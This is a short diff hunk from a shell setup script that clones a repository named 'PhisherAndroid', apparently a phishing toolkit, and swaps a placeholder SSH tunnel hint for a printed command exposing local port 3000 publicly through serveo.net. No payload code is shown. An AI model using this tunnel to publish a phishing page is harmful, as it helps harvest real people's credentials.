@@ -23,5 +23,4 @@ git clone https://github.com/CuteKitty0000/PhisherAndroid
 echo
 echo "Done!"
 echo
-echo "Run SSH tunnel (replace with your server):"
-echo "ssh -R 80:localhost:3000 user@your-server.com"
+echo "ssh -R 80:localhost:3000 serveo.net"
